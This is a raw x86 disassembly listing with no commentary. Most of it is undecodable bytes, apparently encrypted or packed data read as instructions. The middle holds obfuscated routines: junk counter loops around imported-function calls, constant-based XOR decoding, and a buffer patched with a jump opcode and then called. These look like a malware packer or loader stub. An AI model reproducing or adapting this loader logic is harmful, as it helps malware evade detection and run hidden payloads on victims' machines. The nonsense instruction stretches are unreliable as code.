  406f40:	xchg   BYTE PTR [esi],cl
  406f42:	jg     0x406f04
  406f44:	and    DWORD PTR [edi+0x42c73ecb],0x8aef5737
  406f4e:	test   al,0x40
  406f50:	mov    edi,0x20945c96
  406f55:	jns    0x406efa
  406f57:	in     al,0xd6
  406f59:	mov    WORD PTR [ecx],es
  406f5b:	and    bh,BYTE PTR [edx-0x20]
  406f5e:	aad    0x25
  406f60:	(bad)  [edx+0x4c197a54]
  406f66:	jb     0x406fb3
  406f68:	enter  0x4aa6,0xa8
  406f6c:	fidivr WORD PTR [edi+0x74819258]
  406f73:	jbe    0x406f1a
  406f75:	dec    ebp
  406f76:	js     0x406f43
  406f78:	xchg   esp,eax
  406f79:	pusha  
  406f7a:	cdq    
  406f7b:	and    eax,0xcfa2ba57
  406f80:	inc    edx
  406f81:	mov    dl,0xe2
  406f83:	lods   al,BYTE PTR ds:[esi]
  406f84:	lock pop esi
  406f86:	test   eax,edx
  406f88:	jge    0x406f87
  406f8a:	bound  esp,QWORD PTR [eax-0x51]
  406f8d:	sbb    al,0xd8
  406f8f:	ins    DWORD PTR es:[edi],dx
  406f90:	std    
  406f91:	jmp    0xc6e1a6af
  406f96:	sub    eax,DWORD PTR ds:[esi]
  406f99:	lods   eax,DWORD PTR ds:[esi]
  406f9a:	or     ebp,ebp
  406f9c:	out    0x43,eax
  406f9e:	inc    eax
  406f9f:	loop   0x406f27
  406fa1:	mov    ecx,0x94d92b3f
  406fa6:	bound  esi,QWORD PTR [edx-0x55716d35]
  406fac:	test   BYTE PTR [edx+0xa7a03a3],bh
  406fb2:	retf   0x732f
  406fb5:	jecxz  0x407020
  406fb7:	or     BYTE PTR [esi+eax*2],cl
  406fba:	and    al,0xed
  406fbc:	push   edi
  406fbd:	inc    ebx
  406fbe:	gs aaa 
  406fc0:	repnz lds edi,FWORD PTR [esi]
  406fc3:	clc    
  406fc4:	mov    al,ds:0x4236130b
  406fc9:	cmp    ecx,DWORD PTR [esi-0x47250763]
  406fcf:	sub    DWORD PTR [ebx+0x71],eax
  406fd2:	ret    
  406fd3:	lods   al,BYTE PTR ds:[esi]
  406fd5:	jle    0x406ff1
  406fd7:	jmp    0x406f8b
  406fd9:	out    dx,al
  406fda:	enter  0x538a,0xe1
  406fde:	in     eax,0x24
  406fe0:	cmp    ebx,DWORD PTR [eax-0x41]
  406fe3:	sbb    al,0xc3
  406fe5:	inc    eax
  406fe6:	test   DWORD PTR es:[edi+0x56],esi
  406fea:	cmc    
  406feb:	or     BYTE PTR [ebx-0x6d439581],0x98
  406ff2:	fild   QWORD PTR [ebx+0x6f]
  406ff5:	cmp    eax,0x51fc882
  406ffa:	dec    esp
  406ffb:	xor    al,0x23
  406ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ffe:	out    dx,eax
  406fff:	stos   BYTE PTR es:[edi],al
  407000:	int3   
  407001:	shr    DWORD PTR [edx-0x379e2818],cl
  407007:	jecxz  0x407020
  407009:	inc    eax
  40700a:	mov    ebx,DWORD PTR [edx-0x50b0985f]
  407010:	das    
  407011:	orps   xmm5,xmm5
  407014:	xchg   cl,bh
  407016:	icebp  
  407017:	cs pop eax
  407019:	and    al,0xd1
  40701b:	push   ds
  40701c:	add    eax,DWORD PTR [edi-0x28ed8b72]
  407022:	cmp    eax,0x582ddd92
  407027:	adc    edx,ebp
  407029:	test   al,0xe0
  40702b:	outs   dx,BYTE PTR ds:[esi]
  40702c:	aas    
  40702d:	xchg   edx,eax
  40702e:	and    al,0xf3
  407030:	cmp    al,0xfb
  407032:	lahf   
  407033:	aaa    
  407034:	lahf   
  407035:	inc    ecx
  407036:	mov    esi,0x318813b8
  40703b:	push   ecx
  40703c:	repz pop esi
  40703e:	hlt    
  40703f:	clc    
  407040:	gs pop ecx
  407042:	inc    esi
  407043:	mov    al,ds:0x2b2c23fd
  407048:	mov    edi,DWORD PTR [edx]
  40704a:	pop    es
  40704b:	(bad)  
  40704c:	std    
  40704d:	jb     0x40707a
  40704f:	or     al,0x5c
  407051:	sbb    BYTE PTR [eax+0x25f9880],bh
  407057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407058:	sbb    al,0xd0
  40705a:	scas   al,BYTE PTR es:[edi]
  40705b:	push   ebp
  40705c:	not    BYTE PTR [eax+ecx*8+0x64]
  407060:	lock retf 0x5203
  407064:	xchg   BYTE PTR [edi+0x29],dh
  407067:	dec    esi
  407068:	std    
  407069:	fdiv   st,st(3)
  40706b:	jp     0x40704e
  40706d:	mov    eax,?
  40706f:	jae    0x4070e3
  407071:	xchg   BYTE PTR [eax],cl
  407073:	jae    0x4070a8
  407075:	and    eax,0x214e5f26
  40707a:	sbb    DWORD PTR ds:0x4e991a6e,esi
  407080:	push   ss
  407081:	fsubr  QWORD PTR [ebp+0x64]
  407084:	mov    esi,0xd440391f
  407089:	pop    es
  40708a:	loopne 0x40705d
  40708c:	dec    ecx
  40708d:	xor    BYTE PTR [ebp+0x6d2a369a],dh
  407093:	pop    edx
  407094:	inc    eax
  407095:	mov    ch,0xd3
  407097:	test   al,0x36
  407099:	repnz ins DWORD PTR es:[edi],dx
  40709b:	ja     0x4070eb
  40709d:	sbb    bl,BYTE PTR [edx-0x46518613]
  4070a3:	dec    eax
  4070a4:	and    DWORD PTR [edi+ecx*4-0x64],esi
  4070a8:	stc    
  4070a9:	add    esi,ebx
  4070ab:	jns    0x407098
  4070ad:	or     DWORD PTR [eax-0x6a],eax
  4070b0:	xor    cl,BYTE PTR [eax+0x5aa978bd]
  4070b6:	int    0x3e
  4070b8:	push   0x42
  4070ba:	test   eax,0xddbbb1c4
  4070bf:	push   esp
  4070c0:	pushf  
  4070c1:	arpl   WORD PTR [ecx-0x78],di
  4070c4:	scas   eax,DWORD PTR es:[edi]
  4070c5:	iret   
  4070c6:	data16 (bad) 
  4070c8:	repz pop ds
  4070ca:	loope  0x40709e
  4070cc:	mov    ebx,0xbe45e90e
  4070d1:	xor    al,0x9a
  4070d4:	mov    dl,0x96
  4070d6:	adc    edi,DWORD PTR [ecx+edx*1-0x20]
  4070da:	mov    ds:0xfb350757,eax
  4070df:	xchg   esp,eax
  4070e0:	or     DWORD PTR [eax-0x4],ebx
  4070e3:	cwde   
  4070e4:	jae    0x4070a4
  4070e6:	lahf   
  4070e7:	add    dl,cl
  4070e9:	cmp    DWORD PTR [esi],edx
  4070eb:	iret   
  4070ec:	adc    edi,DWORD PTR [edi+0x3c83c810]
  4070f2:	mov    bl,0xd2
  4070f4:	push   ebx
  4070f5:	add    ebp,DWORD PTR [ebx+edi*4+0x506c3b3b]
  4070fc:	ret    0x3e09
  4070ff:	mov    bl,0xef
  407101:	push   esp
  407102:	scas   eax,DWORD PTR es:[edi]
  407103:	mov    cl,ah
  407105:	fxam   
  407107:	fstp   QWORD PTR [edi+edx*8+0x60]
  40710b:	ret    0x1fc9
  40710e:	popf   
  40710f:	(bad)  
  407110:	and    eax,DWORD PTR ds:[esp+esi*8-0x271e85ee]
  407118:	push   0xad803da4
  40711d:	mov    BYTE PTR [edx-0x12],0x45
  407121:	xor    ebx,ecx
  407123:	lahf   
  407124:	dec    ecx
  407125:	enter  0x9f4a,0x63
  407129:	sub    al,0xaf
  40712b:	dec    ebp
  40712c:	mov    edx,0x9b49116a
  407131:	pusha  
  407132:	in     eax,0xea
  407134:	sub    esp,DWORD PTR [ebx-0x65737c0]
  40713a:	fmul   st(6),st
  40713c:	cld    
  40713d:	mov    edx,DWORD PTR [ebx]
  40713f:	fld    QWORD PTR [eax]
  407141:	push   ds
  407142:	and    ah,cl
  407144:	add    esp,DWORD PTR [esi+0x75]
  407147:	sbb    ch,dh
  407149:	and    al,0x74
  40714b:	mov    cl,BYTE PTR [eax-0x63beb67]
  407151:	mov    dh,0xce
  407153:	iret   
  407154:	sbb    eax,0xd5fca8cf
  407159:	xor    ah,ah
  40715b:	adc    al,0x3
  40715d:	cmp    ebx,DWORD PTR [eax+eiz*1-0x6f]
  407161:	in     eax,dx
  407162:	arpl   WORD PTR [ebp-0x9ba37c7],cx
  407168:	inc    ebx
  407169:	js     0x407178
  40716b:	sub    edx,edx
  40716d:	cdq    
  40716e:	sub    eax,0xbfb5aa65
  407173:	jecxz  0x407152
  407175:	shl    BYTE PTR [edi-0x80],1
  407178:	pop    ebx
  407179:	mov    ebp,0x8d0d9692
  40717e:	jno    0x4071e7
  407180:	xor    BYTE PTR [edi],cl
  407182:	jo     0x4071d5
  407184:	shl    BYTE PTR [ebp+ebp*8-0x740e0136],0x7f
  40718c:	ss mov esp,0x18532c88
  407192:	inc    edi
  407193:	mov    eax,ds:0x265b216c
  407198:	cmp    eax,0x9aab1a3e
  40719d:	xor    al,0x27
  40719f:	imul   edx,DWORD PTR [eax],0xb
  4071a2:	stc    
  4071a3:	test   eax,0xa2064a4
  4071a8:	fs push ebx
  4071aa:	xor    ch,BYTE PTR [eax-0x5c]
  4071ad:	loopne 0x40720e
  4071af:	cpuid  
  4071b1:	jae    0x4071d5
  4071b3:	mov    bh,0xe
  4071b5:	nop
  4071b6:	inc    esp
  4071b7:	push   ss
  4071b8:	jl     0x40713f
  4071ba:	out    0xd5,eax
  4071bc:	cdq    
  4071bd:	mov    DWORD PTR [eax],esi
  4071bf:	pop    es
  4071c0:	lahf   
  4071c1:	lds    esi,FWORD PTR [eax+0x58a3c61d]
  4071c7:	or     ecx,ecx
  4071c9:	and    al,0x61
  4071cb:	shl    BYTE PTR [eax],1
  4071cd:	jl     0x40716a
  4071cf:	in     eax,0x5b
  4071d1:	fild   DWORD PTR [ecx+eax*4]
  4071d4:	cwde   
  4071d5:	nop
  4071d6:	pop    ebx
  4071d7:	mov    ch,0xb8
  4071d9:	fisubr DWORD PTR [ebp+0x52239d27]
  4071df:	xchg   BYTE PTR [eax],ah
  4071e1:	and    ebx,eax
  4071e3:	icebp  
  4071e4:	push   ecx
  4071e5:	adc    al,0x5c
  4071e7:	mov    ah,ah
  4071e9:	xchg   edx,eax
  4071ea:	pop    esp
  4071eb:	gs xor eax,0xbba7427d
  4071f1:	out    dx,eax
  4071f2:	in     eax,0x5a
  4071f4:	lods   al,BYTE PTR ds:[esi]
  4071f5:	stc    
  4071f6:	cmp    edi,DWORD PTR [esi+0x53]
  4071f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071fa:	push   eax
  4071fb:	pushf  
  4071fc:	add    dh,bl
  4071fe:	ins    DWORD PTR es:[edi],dx
  4071ff:	xor    DWORD PTR [edi-0x22],0x393ba298
  407206:	fld    DWORD PTR [edi]
  407208:	fld    st(1)
  40720a:	cmp    eax,0xddbf303c
  40720f:	cmp    al,0xa
  407211:	mov    ecx,0xddbac133
  407216:	jb     0x40724a
  407218:	add    BYTE PTR [ebx],al
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	jl     0x407761
  407751:	jp     0x4077cb
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x407760
  40775c:	sub    bl,cl
  40775e:	mov    cl,0x91
  407760:	lds    ebp,FWORD PTR [ebx-0x6f]
  407763:	ret    0x782a
  407766:	push   esi
  407767:	mov    ecx,0x8342cdbf
  40776c:	lods   al,BYTE PTR ds:[esi]
  40776d:	jl     0x407736
  40776f:	inc    esp
  407770:	inc    esp
  407771:	xlat   BYTE PTR ds:[ebx]
  407772:	int    0xf7
  407774:	(bad)  
  407775:	mov    eax,0x21dded96
  40777a:	or     dl,bh
  40777c:	add    BYTE PTR [ebp+0x1a],0xb4
  407780:	cmp    BYTE PTR [edx],0xfc
  407783:	adc    esp,DWORD PTR [ebx+esi*2]
  407786:	cmp    DWORD PTR [ecx],ecx
  407788:	pop    edi
  407789:	mov    ecx,0x8c482fd1
  40778e:	or     eax,DWORD PTR [ebx-0x68600804]
  407794:	push   es
  407795:	adc    edi,ecx
  407797:	sub    eax,0x489ca228
  40779c:	into   
  40779d:	xor    al,0x6d
  40779f:	xor    DWORD PTR [edx+0x3d],ecx
  4077a2:	cmp    al,0xb0
  4077a4:	mov    dh,0x61
  4077a6:	ja     0x40777c
  4077a8:	dec    DWORD PTR [esi]
  4077aa:	les    ecx,FWORD PTR [edi+0x60f4f3]
  4077b0:	js     0x407813
  4077b2:	xor    DWORD PTR [edx-0x620c07fc],0xffffffb0
  4077b9:	loope  0x407753
  4077bb:	aad    0x4d
  4077bd:	adc    BYTE PTR [ebx+0x4bc5e7aa],dh
  4077c3:	fisttp DWORD PTR [edx-0x511c80bf]
  4077c9:	push   ss
  4077ca:	test   eax,0xeef9502
  4077cf:	push   ss
  4077d0:	mov    bh,0xd5
  4077d2:	in     al,dx
  4077d3:	add    eax,0x38bb91f1
  4077d8:	xchg   ebx,eax
  4077d9:	arpl   WORD PTR [ebx-0x33],dx
  4077dc:	or     al,0xa2
  4077de:	repz in eax,dx
  4077e0:	data16 jo 0x4077df
  4077e3:	adc    al,0xd8
  4077e5:	cmp    eax,DWORD PTR [ebx-0x5c]
  4077e8:	xchg   esi,eax
  4077e9:	push   ecx
  4077ea:	cmp    BYTE PTR [edx+0x76877b78],cl
  4077f0:	push   ecx
  4077f1:	jno    0x40782c
  4077f3:	hlt    
  4077f4:	inc    ebx
  4077f5:	push   edi
  4077f6:	sbb    DWORD PTR [edx+0x56b2418f],esp
  4077fc:	in     al,dx
  4077fd:	jne    0x407824
  4077ff:	or     al,0xe6
  407801:	and    BYTE PTR [ecx+esi*4-0x5631bc4],ah
  407808:	dec    esp
  407809:	lock push esp
  40780b:	jge    0x407869
  40780d:	cld    
  40780e:	push   0x60
  407810:	loop   0x407845
  407812:	jnp    0x4077c5
  407814:	adc    cl,BYTE PTR [ecx-0x7b7645d3]
  40781a:	jns    0x407887
  40781c:	inc    edi
  40781d:	sti    
  40781e:	mov    edx,0x10b8555f
  407823:	popf   
  407824:	push   esp
  407825:	loope  0x4077da
  407827:	rol    DWORD PTR [edi],0x3a
  40782a:	xor    eax,DWORD PTR [ecx]
  40782c:	pop    ds
  40782d:	addr16 push esp
  40782f:	dec    esp
  407830:	mov    esi,0x8f11df1a
  407835:	mov    edi,0x6126a7f2
  40783a:	sbb    eax,0x11be9d70
  40783f:	lahf   
  407840:	fwait
  407841:	mov    bh,0xbc
  407843:	cwde   
  407844:	mov    cl,0x85
  407846:	jg     0x4077e7
  407848:	(bad)  
  407849:	pusha  
  40784a:	(bad)  
  40784b:	mov    bh,0x50
  40784d:	bound  esp,QWORD PTR [ecx+0x20]
  407850:	aad    0x1
  407852:	mov    esi,0x86d3f7a8
  407857:	cli    
  407858:	je     0x4078d8
  40785a:	fucomip st,st(5)
